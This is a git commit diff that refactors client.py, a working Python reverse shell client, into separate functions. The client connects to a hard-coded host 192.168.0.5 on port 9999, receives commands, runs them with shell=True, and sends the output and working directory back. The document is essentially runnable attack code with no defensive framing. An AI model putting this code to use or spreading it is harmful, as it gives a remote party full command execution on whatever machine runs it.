33485ef9c47f0965a7accff876f6b69987cce65f
Bucky <buckyroberts@gmail.com>
2015-12-17 22:53:10 -0500

    Cleaning up code.

--- client.py
+++ client.py
@@ -3,20 +3,50 @@ import socket
 import subprocess
 
 
-s = socket.socket()
-host = '192.168.0.5'
-port = 9999
-s.connect((host, port))
+# Create a socket
+def socket_create():
+    try:
+        global host
+        global port
+        global s
+        host = '192.168.0.5'
+        port = 9999
+        s = socket.socket()
+    except socket.error as msg:
+        print("Socket creation error: " + str(msg))
 
-while True:
-    data = s.recv(1024)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        output_bytes = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_bytes, "utf-8")
-        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-        print(output_str)
 
-s.close()
+# Connect to a remote socket
+def socket_connect():
+    try:
+        global host
+        global port
+        global s
+        s.connect((host, port))
+    except socket.error as msg:
+        print("Socket connection error: " + str(msg))
+
+
+# Receive commands from remote server and run on local machine
+def receive_commands():
+    global s
+    while True:
+        data = s.recv(1024)
+        if data[:2].decode("utf-8") == 'cd':
+            os.chdir(data[3:].decode("utf-8"))
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output_bytes = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_bytes, "utf-8")
+            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+            print(output_str)
+    s.close()
+
+
+def main():
+    socket_create()
+    socket_connect()
+    receive_commands()
+
+
+main()
